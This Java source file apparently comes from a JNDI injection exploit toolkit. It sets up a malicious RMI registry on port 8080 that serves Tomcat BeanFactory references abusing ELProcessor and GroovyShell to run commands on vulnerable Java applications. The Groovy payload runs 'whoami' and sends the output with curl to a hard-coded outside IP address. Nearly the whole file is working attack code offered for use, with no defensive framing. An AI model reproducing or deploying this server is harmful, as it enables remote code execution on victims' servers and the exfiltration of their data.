package payloads;

import com.sun.jndi.rmi.registry.*;

import java.net.Inet4Address;
import java.rmi.RemoteException;
import java.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;


public class EvilRMIServer {


    public EvilRMIServer(Listener listener){

    }

    /*
     * Need : Tomcat 8+ or SpringBoot 1.2.x+ in classpath，because javax.el.ELProcessor.
     */
    public ReferenceWrapper execByEL() throws RemoteException, NamingException{
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
                ""
        )));
        return new ReferenceWrapper(ref);
    }

    /*
     * Need : Tomcat and groovy in classpath.
     */
    public ReferenceWrapper execByGroovy() throws RemoteException, NamingException{
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        //String script = String.format("'%s'.execute()", commandGenerator.getBase64CommandTpl());

        String cmd = "curl 18.162.60.133:443/proc.text";
        String script = String.format("'%s'.execute()", cmd);
        script = "def a = 'whoami'.execute().text;def b = 'curl 18.162.60.133:443/'+a;b.execute()";
        System.out.println(script);
        ref.add(new StringRefAddr("x",script));
        System.out.println(new StringRefAddr("x",script));
        return new ReferenceWrapper(ref);
    }


    /**
     *   TODO: Need more methods to bypass in different java app builded by JDK 1.8.0_191+
     */


    public static void main(String[] args) throws Exception{

        System.out.println("Creating evil RMI registry on port 8080");
        Registry registry = LocateRegistry.createRegistry(8080);
        String ip = args[0];
        System.out.println(ip);
        EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener(ip,7777));
        System.setProperty("java.rmi.server.hostname",ip);

        registry.bind("ExecByEL",evilRMIServer.execByEL());
        registry.bind("ExecByGroovy",evilRMIServer.execByGroovy());
    }
}